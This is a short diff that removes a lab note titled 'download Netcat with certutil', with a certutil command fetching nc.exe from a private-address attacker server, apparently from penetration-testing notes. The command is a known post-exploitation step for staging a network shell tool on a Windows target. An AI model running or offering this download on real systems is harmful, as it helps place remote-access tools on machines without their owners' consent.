@@ -1,3 +1,0 @@
-
-download Netcat with certutil:
-certutil -urlcache -split -f http://10.10.14.13:6666/kali-windows-binaries/nc.exe nc.exe
